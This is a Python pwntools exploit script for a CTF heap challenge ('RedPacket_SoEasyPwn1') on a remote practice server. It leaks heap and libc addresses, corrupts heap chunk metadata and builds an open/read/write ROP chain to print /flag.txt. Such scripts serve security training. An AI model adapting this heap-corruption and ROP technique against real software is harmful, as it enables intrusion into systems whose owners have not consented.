import sys
from pwn import *
from ctypes import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./RedPacket_SoEasyPwn1')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./RedPacket_SoEasyPwn1')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',26923)
			elf=ELF('./RedPacket_SoEasyPwn1')
			libc=ELF('../../x64libc/libc-2.29.so')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		def add(a,b,c):
			io.sendlineafter('Your input: ','1')
			io.sendlineafter('Please input the red packet idx: ',str(a))
			io.sendlineafter('(1.0x10 2.0xf0 3.0x300 4.0x400): ',str(b))
			io.sendafter('Please input content: ',c)

		def delete(a):
			io.sendlineafter('Your input: ','2')
			io.sendlineafter('Please input the red packet idx: ',str(a))

		def edit(a,c):
			io.sendlineafter('Your input: ','3')
			io.sendlineafter('Please input the red packet idx: ',str(a))
			io.sendafter('Please input content: ',c)

		def show(a):
			io.sendlineafter('Your input: ','4')
			io.sendlineafter('Please input the red packet idx: ',str(a))
		


		pop_rsi=0x0000000000026f9e
		pop_rdi=0x0000000000026542
		pop_rdx=0x000000000012bda6
		leave_ret=0x0000000000058373
		for i in range(5):
			add(0,2,'aaa')
			add(1,4,'aaa')
			delete(0)
			delete(1)
			if i == 1:
				show(0)
				heap_base=u64(io.recv(6)+'\x00\x00')-0x1270
		for i in range(2):
			add(0,4,'aaa')
			delete(0)
		add(0,4,'aaa')
		add(2,3,'aaa')
		delete(0)
		show(0)
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-96-0x10
		libc.address=libc_base
		add(0xf,3,'aaa')
		add(1,4,'aaa')
		add(0xf,3,'aaa')
		delete(1)
		add(0xf,3,'aaa')
		add(2,4,'aaa')
		add(0xf,3,'aaa')
		delete(2)
		add(0xf,3,'aaa')
		

		rop=p64(libc.address+pop_rdi)+p64(heap_base+0x4940+0x200)+p64(libc.address+pop_rsi)+p64(0)+p64(libc.sym['open'])
		rop+=p64(libc.address+pop_rdi)+p64(3)+p64(libc.address+pop_rsi)+p64(heap_base+0x4940+0x200)+p64(libc.address+pop_rdx)+p64(0x100)+p64(libc.sym['read'])
		rop+=p64(libc.address+pop_rdi)+p64(1)+p64(libc.address+pop_rsi)+p64(heap_base+0x4940+0x200)+p64(libc.address+pop_rdx)+p64(0x100)+p64(libc.sym['write'])
		add(0xf,4,rop.ljust(0x200,'\x00')+'/flag.txt'+'\x00')



		edit(2,'a'*0x308+p64(0x101)+p64(heap_base+0x250+0x900)+p64(heap_base+0x250+0x800))
		# add(5,2,'aaa')



		# io.sendline('666')
		# io.recvuntil('What do you want to say?')
		# io.sendline('a'*0x80+p64(heap_base+0x4940-8)+p64(libc.address+leave_ret))


		# success('heap_basse:'+hex(heap_base))
		# success('libc_base:'+hex(libc_base))
		gdb.attach(io)
		pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue